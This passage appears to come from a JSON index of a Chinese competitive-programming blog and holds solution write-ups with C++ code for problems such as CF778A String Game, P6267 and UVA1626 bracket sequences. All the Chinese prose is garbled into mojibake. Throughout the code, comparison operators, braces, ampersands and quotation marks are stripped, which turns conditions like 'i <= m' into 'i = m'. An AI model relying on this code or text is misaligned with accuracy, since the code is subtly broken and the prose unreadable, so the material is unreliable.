dy)//è¾¹ç•Œæ¡ä»¶ if (str[dx] == cor[j][dy]) --dx,--dy; else --dx; if (!dy) dp[i] = min (dp[i],dp[dx] + (i - dx - dlen[j]));//æˆåŠŸåŒ¹é…æ‰èƒ½è¿›è¡ŒçŠ¶æ€è½¬ç§» printf (%d ,dp[m]);//æ­¤å¤„ä¸º m è€Œä¸æ˜¯ n å“¦ï¼ return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7886 ã€ŒMCOI-06ã€Gerrymandering","path":"/2021/10/05/P7886/","content":"ç”±é¢˜æ„å¯çŸ¥ï¼Œå‡è®¾å¯¹äºä¸€ä¸ª $n \\times m$ çš„è¡¨æ ¼ï¼Œæˆ‘ä»¬ç”¨äº† $p$ ç§é¢œè‰²å»æŸ“è‰²ï¼Œæ˜¾ç„¶æœ‰ $n \\times m = p \\times k$ã€‚ç§»é¡¹å¯çŸ¥ï¼Œ$p = n \\times m \\div k$ã€‚åˆå› ä¸º $p$ æ˜¯æ•´æ•°ï¼Œæ‰€ä»¥éœ€è¦æ»¡è¶³ $(n \\times m) \\bmod k = 0$ æ—¶æ‰æœ‰è§£ã€‚ é‚£ä¹ˆå¯¹äºä¸€å¼ å­˜åœ¨è§£çš„è¡¨æ ¼ï¼Œå¯ä»¥è€ƒè™‘è›‡å½¢æ–¹é˜µå¼çš„æŸ“è‰²ã€‚ä»å·¦ä¸Šè§’å¼€å§‹æŸ“è‰²ï¼Œç„¶åå‘å³ç›´åˆ°æŸ“è‰²è‡³è¾¹ç•Œï¼Œç„¶åå‘ä¸‹ï¼Œå†å‘å·¦è‡³è¾¹ç•Œâ€¦â€¦ä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æŸ“å®Œä¸ºæ­¢ã€‚ä¸ºäº†æ”¾ç½®çˆ†ç©ºé—´ï¼Œæœ¬é¢˜è§£é€‰æ‹©é€è¡Œè¾“å‡ºç­”æ¡ˆï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ vectorï¼‰ã€‚ æœ€åæ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š while (no = num) ++cnt; if (ty == 1)//ä»å·¦å¾€å³ if (dx = m) ans[dx] = no,++dx; else//æ•´ä¸€è¡Œå·²ç»æŸ“è‰²å®Œæ¯• for (int i = 1;i = m;++i) printf (%d ,ans[i]),ans[i] = 0; puts (); ty = 2;dx = m; ans[dx] = no;--dx; else if (ty == 2)//ä»å³å¾€å·¦ if (dx = 1) ans[dx] = no,--dx; else for (int i = 1;i = m;++i) printf (%d ,ans[i]),ans[i] = 0; puts (); ty = 1;dx = 1;ans[dx] = no;++dx; if (cnt % k == 0) ++no;//ä¸€ç§é¢œè‰²çš„è¿é€šå—å¤§å°ä¸º kfor (int i = 1;i = m;++i) printf (%d ,ans[i]);//æœ€åä¸€è¡Œputs ();","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF778A String Game","path":"/2021/09/11/CF778A/","content":"åˆ é™¤å­—æ¯çš„ä¸ªæ•°æ˜¾ç„¶è¶Šå¤šè¶Šå¥½ï¼Œå†çœ‹é¢˜ç›®ä¸­çš„ Note that after removing one letter, the indices of other letters dont change. è¿™å¥è¯ï¼Œæ„æ€æ˜¯åˆ é™¤ä¸€ä¸ªå­—æ¯åï¼Œå…¶ä»–å­—æ¯çš„ç´¢å¼•ä¸ä¼šæ›´æ”¹ã€‚å› æ­¤å¯ä»¥äºŒåˆ†å¯ä»¥åˆ é™¤çš„å­—æ¯çš„ä¸ªæ•°ï¼Œæœ€åè¾“å‡ºæœ€å¤§å€¼ã€‚ é¦–å…ˆç¡®å®šäºŒåˆ†çš„èŒƒå›´ï¼Œç”±æ•°æ®èŒƒå›´å¯çŸ¥ï¼Œ$p$ ä¸²æœ€å°‘åˆ é™¤çš„å­—æ¯æ•°é‡ä¸º $0$ã€‚åˆå› ä¸ºå†åˆ é™¤è‹¥å¹²ä¸ªå­—æ¯åçš„é•¿åº¦ä¸€å®šä¸æ¯” $t$ ä¸²çš„é•¿åº¦å°ï¼Œé‚£ä¹ˆè®¾ä¸¤ä¸ªä¸²çš„é•¿åº¦åˆ†åˆ«ä¸º $lenp,lent$ï¼Œåˆ™æœ€å¤šåˆ é™¤çš„å­—æ¯æ•°é‡ä¸º $lenp - lent$ã€‚ å…¶æ¬¡å†æ¥æ€è€ƒåˆ é™¤å­—æ¯ååˆ¤æ–­ $p$ ä¸²ä¸­æ˜¯å¦ä»å­˜åœ¨ $t$ ä¸²çš„æ–¹å¼ã€‚å…ˆè®¡ç®—å‡ºè¢«åˆ é™¤è‹¥å¹²ä¸ªå­—æ¯çš„æ–° $p$ ä¸²ï¼Œç„¶ååˆ©ç”¨ä¸¤ä¸ªæŒ‡é’ˆ $dx,dy$ï¼Œåˆ†åˆ«è¡¨ç¤ºæ–° $p$ ä¸²ä¸ $t$ ä¸²çš„åŒ¹é…çŠ¶æ€ã€‚é€šè¿‡ while å¾ªç¯ï¼Œé€ä¸€åˆ¤æ–­ï¼Œæ˜¾ç„¶èƒ½æˆåŠŸåŒ¹é…çš„æ¡ä»¶æ˜¯ $dy = lent$ï¼Œå³è¡¨ç¤º $t$ ä¸²ä¸­çš„æ‰€æœ‰å­—æ¯éƒ½åœ¨æ–° $p$ ä¸²ä¸­æŒ‰é¡ºåºå‡ºç°ã€‚ é€šè¿‡äºŒåˆ†ç­”æ¡ˆï¼Œå¤§å¤§åœ°å‡å°‘äº†æœç´¢çš„æ¬¡æ•°ï¼Œæ—¶é—´å¤æ‚åº¦ä¹Ÿå˜ä¸º $O(n \\log n)$ï¼Œ$n$ è¡¨ç¤º $p$ ä¸²çš„é•¿åº¦ã€‚å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int lena,lenb,cnt,num[MAX];char a[MAX],b[MAX],str[MAX];bool del[MAX];bool check (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%s%s,a,b); lena = strlen (a);lenb = strlen (b); for (int i = 1;i = lena;++i) num[i] = read (); int l = 0,r = lena - lenb;//ç¡®å®šèŒƒå›´ while (l = r)//äºŒåˆ†ç­”æ¡ˆ int mid = (l + r) 1; if (check (mid)) l = mid + 1; else r = mid - 1; printf (%d ,l - 1); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool check (int x) for (int i = 1;i = lena;++i) del[i] = 0;//åˆå§‹åŒ– for (int i = 1;i = x;++i) del[num[i]] = 1;//åˆ é™¤çš„å­—æ¯çš„ä¸‹æ ‡æ ‡è®°ä¸º 1 cnt = 0; for (int i = 0;i lena;++i) if (!del[i + 1]) str[++cnt] = a[i];//æ„æˆæ–°å­—ç¬¦ä¸² p int dx = 1,dy = 0; while (dx = cnt dy lenb)//å¾ªç¯é€ä¸€æ¯”è¾ƒ if (str[dx] == b[dy]) ++dx,++dy; else ++dx; if (dy != lenb) return 0;//æ²¡æœ‰å®Œå…¨åŒ¹é… else return 1;//èƒ½å®Œå…¨åŒ¹é…","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF822B Crossword solving","path":"/2021/08/30/CF822B/","content":"å¯¹äºè¾“å…¥çš„ä¸¤ä¸ªå­—ç¬¦ä¸² $s,t$ï¼Œè¦ä¿®æ”¹ $s$ ä¸­å°½å¯èƒ½å°‘çš„å­—ç¬¦ï¼Œä½¿å…¶èƒ½åœ¨å­—ç¬¦ä¸² $t$ ä¸­è¢«æŸ¥æ‰¾åˆ°ã€‚ ç›´æ¥æƒ³åˆ°æœ€æœ´ç´ çš„æšä¸¾ç®—æ³•ï¼Œæšä¸¾å­—ç¬¦ä¸² $t$ çš„å·¦ç«¯ç‚¹ï¼Œå› å­—ç¬¦ä¸² $s$ çš„é•¿åº¦ä¸å˜ï¼Œæ‰€ä»¥å³ç«¯ç‚¹ä¹Ÿèƒ½å¤ŸåŒæ—¶è¢«ç¡®å®šã€‚ç„¶åæ¯æ¬¡åˆ¤æ–­å½“å­—ç¬¦ä¸² $s$ ä¿®æ”¹ä¸ºå­—ç¬¦ä¸² $t$ ä¸­ç­‰é•¿çš„æŸä¸€æ®µæ—¶ï¼Œéœ€è¦ä¿®æ”¹çš„å­—ç¬¦æ•°é‡ï¼Œä¹Ÿå°±æ˜¯ä¸¤è€…ä¸ç›¸åŒçš„å­—ç¬¦çš„æ•°é‡ã€‚å½“ç­”æ¡ˆæœ‰æ›´æ–°çš„æ—¶å€™ï¼ŒåŒæ—¶è®°å½•ä¸‹éœ€è¦ä¿®æ”¹çš„æ¯ä¸€ä¸ªä½ç½®ã€‚ æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š for (int i = 1;i = m - n + 1;++i)//æšä¸¾å·¦ç«¯ç‚¹ï¼Œæ³¨æ„èŒƒå›´ int tot = 0;//è®¡æ•°å™¨çš„åˆå§‹åŒ– for (int j = 1,k = i;j = n;++j,++k) if (a[j] != b[k]) ++tot;//ä¸¤è€…ä¸åŒçš„æ•°é‡ if (tot ans)//å‡ºç°æ›´ä¼˜çš„ç­”æ¡ˆ cnt = 0;ans = tot;//æ›´æ–°ç­”æ¡ˆ for (int j = 1,k = i;j = n;++j,++k)//ä¾æ¬¡è®°å½•æ¯ä¸€ä¸ªä½ç½® if (a[j] != b[k]) num[++cnt] = j;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7321 ã€ŒPMOI-4ã€çŒœæ’åˆ—","path":"/2021/08/23/P7321/","content":"$\\texttt{Subtask # 1}$ æˆ‘ä»¬ç›´æ¥æ‰‹åŠ¨æ¨¡æ‹Ÿã€‚é¦–å…ˆè‚¯å®šè¦è¿›è¡Œä¸€æ¬¡ ? l S p æ“ä½œæ±‚å¾— $4$ çš„ä½ç½®ã€‚ç„¶åå‘ç° $1$ è‡³ $3$ ä¸­åªæœ‰ $3$ é™¤ $4$ æ— æ³•æ•´é™¤ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ ! x y æ“ä½œæ±‚å¾— $3$ çš„ä½ç½®ã€‚åŒç†æ±‚å‡º $2$ çš„ä½ç½®ï¼Œåˆ™æœ€åå‰©ä¸‹çš„ä¸€ä¸ªä½ç½®å°±æ˜¯ $1$ äº†ã€‚ $\\texttt{Subtask # 2-3}$ $m_2$ å¾ˆå¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åªç”¨ ? l S p æ“ä½œæ¯æ¬¡æ±‚å‡º $[1,n]$ é—´çš„æœ€å¤§å€¼ï¼Œç„¶åä¸æ–­ç¼©å°åŒºé—´ç›´è‡³ $[1,1]$ã€‚ $\\texttt{Subtask # 4-6}$ çœ‹åˆ° $m_2$ çš„å€¼åœ¨ $20$ ä»¥å†…ï¼Œä¾¿èƒ½çŒœæƒ³å¤æ‚åº¦ä¸ $2$ çš„å¹‚æ¬¡æœ‰å…³ã€‚è®¡ç®—äº†ä¸€ä¸‹ $2^{15}$ ä¸ $5 \\times 10^4$ å¤§è‡´æ¥è¿‘ï¼Œæ•…å†æ¬¡è”æƒ³åˆ°äºŒåˆ†ã€‚äºæ˜¯ä¹ï¼Œå°±æœ‰äº†äºŒåˆ†ç­”æ¡ˆçš„åšæ³•ã€‚ å¯¹äº ! x y æ“ä½œï¼Œå› ä¸ºä¸€å®šè¦ä¿è¯è¯¢é—®åˆæ³•ï¼Œæ‰€ä»¥ä¸€å®šæ˜¯å»ºç«‹åœ¨æ’åˆ—ä¸Šçš„æŸä½å·²ç»ç¡®å®šçš„æƒ…å†µä¸‹ã€‚é‚£ä¹ˆè‚¯å®šéœ€è¦å…ˆä» ? l S p æ“ä½œä¸­è·å–ä¸€ä¸ªæ•°ä»¥å¼€å§‹è¯¢é—®ã€‚æˆ‘ä»¬æƒ³è¦æ±‚å‡º $[1,n]$ å†…çš„æ’åˆ—ï¼Œå¯ä»¥å…ˆç”¨ ? l S p æ“ä½œè·å– $n$ çš„ä½ç½®ï¼Œç„¶åå¯ä»¥æ ¹æ® $n \\bmod (\\frac{n}{2},n)$ ï¼Œå…¶ä¸­ä½™æ•°äº’éƒ¨ä¸é‡å¤çš„æ€§è´¨ç”¨ ! x y æ“ä½œæ±‚è§£å‡º $(\\frac{n}{2},n)$ å†…æ‰€æœ‰æ•°çš„ä½ç½®ã€‚ç„¶åç»§ç»­å‡åŠé‡å¤æ“ä½œç›´åˆ° $n = 1$ åæŠŠæœ€åä¸€ä¸ªå‰©ä¸‹çš„ä½ç½®æ ‡è®°ä¸º $1$ å³å¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ç”±äº $m_3$ çš„é™åˆ¶ï¼Œæ‰€ä»¥ ? l S p æ“ä½œæ—¶çš„ $l$ çš„å¤§å°åº”è¯¥ä¸ºè¿˜æœªè¢«ç¡®å®šçš„æ•°çš„ä¸ªæ•°ï¼Œè€Œä¸æ˜¯è‰ç‡çš„èµ‹å€¼ä¸ºæ’åˆ—çš„å¤§å°ã€‚ $\\texttt{Subtask # 7}$ ä½†æ˜¯ç”±äºä¸€å¼€å§‹çš„ ? l S p æ“ä½œï¼Œç»è¿‡è®¡ç®—å‘ç°æ­¤æ—¶ä»£ç æ— æ³•é€šè¿‡æœ€åä¸€ä¸ªå­ä»»åŠ¡ã€‚æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯åœ¨æœ€åä¸€æ¬¡äºŒåˆ†æ—¶ç‰¹åˆ¤ä»¥å‡å°‘ä¸€æ¬¡ ? l S p æ“ä½œã€‚æœ€åä¸€æ¬¡äºŒåˆ†æ“ä½œæ˜¯åœ¨ $[1,2]$ æˆ– $[1,3]$ çš„èŒƒå›´æ—¶ï¼Œä½†å› ä¸ºé¢˜ä¸­ $n$ çš„å¤§å°å·²ç»ç¡®å®šï¼Œæ‰€ä»¥è®¡ç®—å¾—å‡ºåªéœ€è¦ç‰¹åˆ¤åè€…çš„æƒ…å†µå³å¯ã€‚æˆ‘ä»¬ä»ç„¶ç”¨ç¬¬ä¸€ä¸ªæ“ä½œä¸­ä½™æ•°äº’ä¸ç›¸åŒä»¥æ±‚å‡ºåŒºé—´ä¸­ä¸åŒçš„æ•°çš„æ€§è´¨ï¼Œå‘ç° $5 \\bmod i (1 \\le i \\le 3)$ï¼Œæ°å¥½ä½™æ•°äº’ä¸ç›¸åŒï¼Œæ•…æœ€å°‘ä½¿ç”¨ä¸¤æ¬¡ ! x y æ“ä½œä»£æ›¿åŸæ¥çš„ ? l S p æ“ä½œæ±‚å‡ºã€‚ ç¨‹åºçš„å®Œæ•´ä»£ç è¾ƒé•¿ï¼Œæ”¾å…¥å‰ªè´´æ¿ä¸­ï¼šæˆ³æˆ‘ã€‚","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6267 [SHOI2002]Nçš„è¿ç»­æ•°æ‹†åˆ†","path":"/2021/08/20/P6267/","content":"[SHOI2002]Nçš„è¿ç»­æ•°æ‹†åˆ†ã€æ•°æ®åŠ å¼ºç‰ˆã€‘ æ¥ä¸€ä¸ªå’Œå…¶å®ƒé¢˜è§£ç¨ç¨æœ‰äº›ä¸ä¸€æ ·çš„åšæ³•ã€‚ é¦–å…ˆè¿˜æ˜¯åˆ—å‡ºç­‰å¼ï¼Œè®¾æœ€å°çš„æ­£æ•´æ•°ä¸º $l$ï¼Œæœ€å¤§çš„æ­£æ•´æ•°ä¸º $r$ï¼Œåˆ™ç”±æ±‚å’Œå…¬å¼å¯åˆ—å‡ºå¼å­ï¼š \\begin{cases} 0 < l \\le r \\le n\\\\ l,r \\in \\mathbb{N^*}\\\\ \\dfrac{1}{2}(l + r) (r - l + 1) = n\\\\ \\end{cases}åŒ–ç®€ä¸€ä¸‹ç¬¬äºŒä¸ªå¼å­ä¾¿æ˜¯ $(l + r) (r - l + 1) = 2n$ï¼Œå› æ­¤å¿…é¡»è¦æœ‰ $l + r \\mid 2n$ ä¸” $r - l + 1 \\mid 2n$ã€‚å†è®¾ $a = l + r,b = r - l + 1$ï¼Œç›´æ¥è§£å¾— \\begin{cases} r = \\dfrac{a + b - 1}{2}\\\\ l = a - r \\end{cases}æ˜¾ç„¶å½“ $2 \\mid a + b - 1$ æ—¶æ‰æœ‰æ­£æ•´æ•°è§£ã€‚å› æ­¤æˆ‘ä»¬æšä¸¾ $2n$ çš„å› æ•°ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ç¬¦åˆæ¡ä»¶ï¼Œç„¶åç´¯åŠ ç­”æ¡ˆã€‚ç”±äºå› æ•°ä¸¤ä¸¤é…å¯¹ï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦ä¸º $O(\\sqrt{2n})$ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š int work (ll x) int cnt = 0; x = 1; for (ll i = 2;i * i = x;++i)//è®°å¾—ä¸º long long if (x % i == 0) if ((i + x / i) 1) ++cnt; return cnt; é‚£ä¹ˆè¿˜æœ‰æ²¡æœ‰æ›´ä¼˜çš„è§£æ³•å‘¢ï¼Ÿï¼Ÿ æˆ‘ä»¬è§‚å¯Ÿ $a,b$ çš„å¥‡å¶æ€§ï¼Œå› ä¸º $2 \\mid a + b - 1$ æ‰å­˜åœ¨è§£ï¼Œä¹Ÿå°±æ˜¯ $a + b$ ä¸€å®šä¸ºå¥‡æ•°ã€‚åˆå› ä¸ºåªæœ‰åœ¨å¥‡æ•°ä¸å¶æ•°ç›¸åŠ æ—¶æ‰å¾—åˆ°å¥‡æ•°ï¼Œæ‰€ä»¥ $a,b$ å¿…å®šä¸ºä¸€å¥‡ä¸€å¶ã€‚æ‰€ä»¥å¯ä»¥å°†é¢˜ç›®è½¬åŒ–ä¸ºæ±‚ $2n$ çš„å¥‡æ•°å› å­ï¼Œç­‰åŒä¸æ±‚ $n$ çš„å¥‡æ•°å› å­ã€‚ å…ˆå°† $n$ è¿›è¡Œè´¨å› æ•°åˆ†è§£ $n = \\prod_{i = 1}^{k} p_i^{c_i}$ï¼Œç„¶åæ ¹æ®ç®—æ•°åŸºæœ¬å®šç†ï¼Œé™¤å»å”¯ä¸€çš„å¶è´¨æ•° $2$ åæ±‚å¥‡æ•°å› æ•°ä¸ªæ•°å³å¯ã€‚å› ä¸ºè´¨æ•°ä¸­é™¤äº† $2$ å‡ä¸ºå¥‡æ•°ï¼Œæ‰€ä»¥å…ˆé¢„å¤„ç†å‡º $\\sqrt{n}$ å†…çš„è´¨æ•°ï¼Œç„¶åå†æ±‚å› æ•°æ—¶æŠŠæ‰€æœ‰ $2$ é™¤å»å³å¯ã€‚å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š //è¿™ä¸ªæ–¹æ³•åœ¨å¤šç»„æ•°æ®ä¸­ä¼šæ›´ä¼˜#include iostream#include cstdio#include cmath#define ll long longusing namespace std;const int MAX = 3e7 + 5;int cnt,p[MAX 1];//p è®°å½•è´¨æ•°ï¼Œæ˜¾ç„¶ sqrt (n) çš„ä¸€åŠè¶³å¤Ÿäº†ll n;bool flag[MAX];void pre (int x);int main () //å…ˆåˆ†è§£è´¨å› å­ï¼Œç„¶åè®¡ç®—å¥‡å› å­çš„ä¸ªæ•° scanf (%lld,n); pre ((int)sqrt (n));//æšä¸¾åˆ° sqrt(n) int ans = 1; for (int j = 1;j = cnt (ll)p[j] * p[j] = n;++j)//è¾¹ç•Œæšä¸¾ int k = 0; while (n % p[j] == 0) if (j != 1) ++k;//ç¬¬ä¸€ä¸ªè´¨æ•°ä¸º 2 n /= p[j]; ans *= (k + 1);//ç®—æ•°åŸºæœ¬å®šç† if (n 2) ans *= 2;//æ³¨æ„å‰©ä½™çš„é‚£ä¸ªè´¨æ•°ä¹Ÿéœ€è¦æ˜¯å¥‡æ•°æ‰è¡Œ printf (%d ,ans); return 0;void pre (int x)//çº¿æ€§ç­›è´¨æ•° for (int i = 2;i = x;++i) if (!flag[i]) p[++cnt] = i; for (int j = 1;j = cnt;++j) if (i * p[j] x) break; flag[i * p[j]] = 1; if (i % p[j] == 0) break;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šUVA1626 æ‹¬å·åºåˆ— Brackets sequence","path":"/2021/08/15/UVA1626/","content":"è¿™æ˜¯ä¸€é“åŒºé—´ $\\texttt{dp}$ çš„å…¸å‹é¢˜ç›®ã€‚ è®¾ $dp_{i,j}$ è¡¨ç¤ºä¸²ä¸­ç¬¬ $i$ ä¸ªåˆ°ç¬¬ $j$ ä¸ªæ‹¬å·ä¸²æœ€å°‘éœ€è¦æ‹¬å·æ‰èƒ½å®Œå…¨åŒ¹é…çš„ä¸ªæ•°ã€‚æœ‰ä¸¤ä¸ªæ˜¾ç„¶çš„ç»“è®ºï¼šä¸€æ˜¯ $dp_{i,i} = 1$ï¼Œå› ä¸ºä¸€ä¸ªæ‹¬å·æ— æ³•åŒ¹é…ï¼Œè¦ä¸”ä»…éœ€è¦ä¸€ä¸ªæ‹¬å·å³èƒ½å®Œå…¨åŒ¹é…ï¼›äºŒæ˜¯åˆå¹¶çš„æ—¶å€™æ˜¯ä»å°åŒºé—´å¾€å¤§åŒºé—´åˆå¹¶ï¼Œå› ä¸ºåªæœ‰è®¡ç®—å®Œå°åŒºé—´çš„ç­”æ¡ˆæ‰èƒ½æ›´æ–°å¤§åŒºé—´ã€‚ å¯¹äºä¸€ä¸ª $i$ è‡³ $j$ çš„åŒºé—´ï¼ˆ$i j$ï¼‰ï¼Œå¯ä»¥ç”±åœ¨æ­¤åŒºé—´å†…çš„ä»»æ„ä¸¤ä¸ªå°åŒºé—´åˆå¹¶å¾—åˆ°ç­”æ¡ˆï¼Œä¹Ÿå°±æ˜¯ $dp_{i,j} = \\min (dp_{i,j},dp_{i,k} + dp_{k + 1,j}),i \\le k j$ã€‚å½“ç„¶ï¼Œå½“ $i$ ä¸ $j$ æœ¬èº«åŒ¹é…æ—¶ï¼Œéœ€è¦å…ˆå–ä¸ªæœ€å€¼ $dp_{i,j} = \\min (dp_{i,j},dp_{i + 1,j - 1})$ã€‚ é¢˜ç›®è¿˜éœ€è¦è¾“å‡ºæ–¹æ¡ˆï¼Œä¹Ÿå°±æ˜¯è¦é€šè¿‡é€’å½’ç”±ç­”æ¡ˆå€’é€€è¿‡ç¨‹ã€‚f(i,j) è¡¨ç¤ºè¦è¿˜åŸçš„æ‹¬å·çš„èŒƒå›´ã€‚æ˜¾ç„¶ $i = j$ çš„æ—¶å€™ç›´æ¥åŒ¹é…æ‹¬å·çš„å¦ä¸€åŠï¼›å½“ $i$ ä¸ $j$ åŒ¹é…æ—¶ï¼Œç›´æ¥å¯ä»¥è¾“å‡ºè¿™ä¸¤ä¸ªæ‹¬å·ï¼Œé—®é¢˜ä¹Ÿå°±ç¼©å°ä¸ºæ±‚ f(i + 1,j - 1)ï¼›å¦‚æœä¸åŒ¹é…ï¼Œå°±æ¨¡æ‹ŸåŒºé—´ $\\texttt{dp}$ çš„è¿‡ç¨‹ï¼Œæ‰¾åˆ°ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„ $k$,ç„¶ååˆ†åˆ«æ±‚è§£ f(i,k) ä¸ f(k + 1,j) å°±è¡Œäº†ã€‚ å¯¹äºæ•°ç»„åˆå§‹åŒ–çš„æ–¹å¼ï¼Œåˆ†ä¸ºä¸‰ç§æƒ…å†µï¼Œåˆ—ä¸¾å¦‚ä¸‹ï¼š $i = j$ï¼Œå°±æ˜¯ $dp_{i,j} = 1$ã€‚ $i j$ï¼Œæ˜¾ç„¶æ­¤æ—¶ä¸æˆä¸²ï¼Œä¸ºé˜²æ­¢å¹²æ‰°ï¼Œå°†å…¶è®¾ç½®ä¸º $0$ã€‚ $i j$ï¼Œå› ä¸ºåŒºé—´ $\\texttt{dp}$ è¦å–æœ€å°å€¼ï¼Œæ‰€ä»¥å…¨éƒ¨è®¾ç½®ä¸º $\\infty$ã€‚ æœ€åæé†’ä¸€ä¸‹å„ä½å¯¹äºé¢˜ç›®å¤šç»„æ•°æ®çš„ä¸€ä¸ªå°æé†’ï¼šä¸è¦å¿˜è®°åˆå§‹åŒ–ï¼ä¸è¦å¿˜è®°ç»„é—´çš„ç©ºæ ¼ï¼ä¸è¦åœ¨æœ€åä¸€ç»„æ•°æ®è¿™å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ï¼å¯èƒ½è¾“å…¥æœ‰ç©ºä¸²ï¼ å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 105;const int MOD = 1e9 + 7;inline int read ();string str;int n,t,dp[MAX][MAX];void print (int x,int y);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) init (dp); getline (cin,str); getline (cin,str); int n = str.size (); if (!n)//æ³¨æ„æœ‰ç©ºä¸²çš„æƒ…å†µï¼Œæ‰€ä»¥ç”¨ getline è¾“å…¥ puts (); if (t) puts (); continue; for (int i = 0;i n;++i) for (int j = 0;j n;++j) if (i == j) dp[i][j] = 1;//æ˜¾ç„¶åªéœ€è¦åŒ¹é…ä¸€ä¸ª else if (i j) dp[i][j] = 0;//ä¸æˆä¸² else dp[i][j] = INF;//å› ä¸ºè¦å– minï¼Œæ‰€ä»¥è®¾ç½®ä¸ºæ­£æ— ç©· for (int j = 0;j n;++j)//å°åŒºé—´ - å¤§åŒºé—´ï¼Œæ³¨æ„æšä¸¾é¡ºåº for (int i = j - 1;i = 0;--i) if (str[i] == ( str[j] == ) || str[i] == [ str[j] == ]) dp[i][j] = min (dp[i][j],dp[i + 1][j - 1]); //åŒ¹é…æƒ…å†µ for (int k = i;k j;++k) dp[i][j] = min (dp[i][k] + dp[k + 1][j],dp[i][j]); //printf (%d ,dp[1][n]); print (0,n - 1); puts (); if (t) puts ();//æ ¼å¼æ³¨æ„ä¸€ä¸‹ return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void print (int x,int y)//ä¾æ® dp æ–¹å¼å›æº¯æ‰“å° if (x y) return ; if (x == y) if (str[x] == ( || str[x] == )) printf (()); else printf ([]); return ; if (((str[x] == ( str[y] == )) || (str[x] == [ str[y] == ])) dp[x][y] == dp[x + 1][y - 1]) printf (%c,str[x]); print (x + 1,y - 1); printf (%c,str[y]); return ; for (int k = x;k y;++k) if (dp[x][y] == dp[x][k] + dp[k + 1][y]) print (x,k);print (k + 1,y); return ;//æ‰¾åˆ°ä¸€ç»„å°±å¯ä»¥äº†","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF527C Glass Carving","path":"/2021/08/06/CF527C/","content":"å¯¹äºæ¯ä¸€æ¬¡åˆ‡å‰²åï¼Œæ±‚å‡ºæœ€å¤§çš„ç¢ç‰‡é¢ç§¯ï¼Œä¹Ÿå°±æ˜¯æ±‚å‡ºå®Œæ•´çš„ç»ç’ƒçš„æœ€å¤§é•¿åº¦ä¸æœ€å¤§å®½åº¦ä¹‹ç§¯ã€‚ ç”±é¢˜æ„å¯çŸ¥ï¼Œä¸€æ¡é•¿åº¦ä¸º $k$ çš„è¾¹ï¼Œæœ€å¤šå¯ä»¥è¢«åˆ‡ $k - 1$ æ¬¡ï¼Œå› ä¸ºåœ¨æ­¤ä¹‹åå‡ä¸ºé•¿åº¦ä¸º $1$ çš„è¾¹æ— æ³•åœ¨åˆ‡å‰²ã€‚äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥ç”¨ $0$ æˆ– $1$ æ¥è¡¨ç¤ºè¯¥è¾¹çš„æŸä¸ªç‚¹æ˜¯å¦è¢«åˆ‡å‰²ï¼Œæ€»å…±è¡¨ç¤º $k - 1$ ä¸ªç‚¹ã€‚åˆå§‹çš„æ—¶å€™æ¯ä¸ªç‚¹å‡ä¸º $0$ï¼Œè¡¨ç¤ºæ‰€æœ‰çš„ç‚¹å‡æœªè¢«åˆ‡å‰²ï¼Œæ¯è¾“å…¥ä¸€æ¬¡åå°†ç›¸åº”çš„åˆ‡å‰²ç‚¹æ ‡è®°ä¸º $1$ã€‚äºæ˜¯ä¹ï¼Œä¸éš¾å°†é—®é¢˜è½¬åŒ–æˆæ±‚æ¯æ¬¡åˆ‡å‰²åæ¯æ¡è¾¹çš„æœ€é•¿ $0$ çš„ä¸ªæ•°ã€‚ è€ƒè™‘ç”¨çº¿æ®µæ ‘æ¥ç»´æŠ¤ï¼Œä¸€æ£µçº¿æ®µæ ‘å…±æœ‰ä»¥ä¸‹å‚æ•°ï¼šlenã€lã€r ä¸ mxï¼Œåˆ†åˆ«è¡¨ç¤ºåŒºé—´çš„é•¿åº¦ã€ä»å·¦ç«¯ç‚¹æœ€é•¿ $0$ çš„ä¸ªæ•°ã€ä»å³ç«¯ç‚¹æœ€é•¿ $0$ çš„ä¸ªæ•°ä»¥åŠè¯¥åŒºé—´æœ€é•¿ $0$ çš„ä¸ªæ•°ã€‚ ä¸‹é¢æˆ‘å°†åˆ†åˆ«è®²è¿° build ã€ modify ä¸ pushup å‡½æ•°ã€‚ åœ¨ build 